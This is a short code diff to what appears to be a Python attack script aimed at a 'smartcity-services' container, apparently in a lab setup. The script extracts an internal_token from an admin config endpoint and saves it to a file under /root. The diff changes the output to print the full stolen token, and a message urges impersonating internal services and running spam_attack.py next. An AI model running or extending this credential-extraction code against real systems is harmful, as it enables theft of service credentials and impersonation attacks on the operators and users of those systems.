@@ -22,7 +22,7 @@ import urllib.request
 import urllib.error
 from datetime import datetime
 
-TOKEN_FILE = "/tmp/sc_extracted_token.txt"
+TOKEN_FILE = "/root/sc_token.txt"
 
 
 def _incus_ip(container="smartcity-services"):
@@ -76,7 +76,8 @@ for i in range(1, args.probes + 1):
                         with open(TOKEN_FILE, "w") as f:
                             f.write(token)
                         print(f"[!] CREDENTIAL LEAK — internal_token extracted from /api/admin/config")
-                        print(f"[!] Token: {token[:12]}...  saved to {TOKEN_FILE}")
+                        print(f"[!] Token: {token}")
+                        print(f"[!] Saved to {TOKEN_FILE}")
                         print(f"[!] Can now impersonate internal services — run spam_attack.py next")
                 except Exception:
                     pass
